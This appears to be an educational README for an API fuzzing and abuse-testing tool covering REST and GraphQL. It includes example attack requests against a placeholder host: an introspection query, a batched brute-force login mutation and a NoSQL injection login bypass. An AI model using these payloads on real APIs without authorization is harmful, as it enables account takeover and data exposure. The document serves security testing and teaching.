# API Abuse/Fuzzing Tool

## What the Tool is For:
A comprehensive API security testing framework that performs fuzzing, abuse case testing, and vulnerability assessment against REST and GraphQL endpoints to identify security flaws, business logic vulnerabilities, and abuse scenarios.

## About:
This tool systematically tests APIs for common vulnerabilities including injection flaws, broken authentication, excessive data exposure, rate limiting bypasses, and GraphQL-specific attacks like introspection abuse and batching attacks.

## General Algorithm:
```
1. API Discovery & Endpoint Enumeration
   - Spidering/documentation parsing
   - GraphQL introspection
   - Endpoint discovery

2. Schema Analysis & Attack Surface Mapping
   - Parameter identification
   - Data type analysis
   - Authentication requirements

3. Intelligent Fuzzing
   - Input validation bypass
   - SQL/NoSQL injection
   - Command injection
   - Business logic abuse

4. GraphQL-Specific Attacks
   - Introspection abuse
   - Query batching
   - Field duplication
   - Aliasing attacks

5. Security Headers & Configuration Testing
   - CORS misconfigurations
   - Security headers
   - HTTP methods testing

6. Reporting & Analysis
   - Vulnerability classification
   - Proof-of-concept generation
   - Remediation guidance
```

## How to Run the Code:

### Python Version:
```bash
# Install dependencies
pip install requests graphql-core

# Basic scan
python3 api_fuzzer.py https://api.example.com

# With authentication
python3 api_fuzzer.py https://api.example.com --auth "Bearer token123"

# With custom headers
python3 api_fuzzer.py https://api.example.com --headers '{"User-Agent": "Mozilla/5.0"}'

# Multi-threaded
python3 api_fuzzer.py https://api.example.com --threads 10
```

### C Version:
```bash
# Install dependencies
sudo apt-get install libcurl4-openssl-dev libjansson-dev

# Compile
gcc -o api_fuzzer api_fuzzer.c -lcurl -ljansson

# Run
./api_fuzzer https://api.example.com
```

## Example Test Scenarios:

### 1. GraphQL Introspection Abuse:
```bash
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
```

### 2. Batch Attack:
```bash
# Create batch request with 1000 login attempts
echo '[
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"test@test.com\", password: \"pass2\") { token } }"}
  # ... repeat 1000 times
]' | curl -X POST https://api.example.com/graphql -H "Content-Type: application/json" -d @-
```

### 3. NoSQL Injection:
```bash
curl -X POST https://api.example.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}'
```

## Key Features:

1. **Multi-Protocol Support**: REST, GraphQL, and common API patterns
2. **Comprehensive Fuzzing**: SQLi, NoSQLi, XSS, Command Injection, Path Traversal
3. **Business Logic Testing**: Price manipulation, IDOR, enumeration
4. **GraphQL-Specific Attacks**: Introspection, batching, aliasing
5. **Configuration Testing**: CORS, HTTP methods, security headers
6. **Rate Limit Testing**: Bypass techniques and abuse detection

## Educational Value:

This tool teaches students:
- API security testing methodologies
- Common API vulnerability patterns
- GraphQL-specific attack vectors
- Business logic flaw identification
- Automated security assessment techniques
- API abuse case development
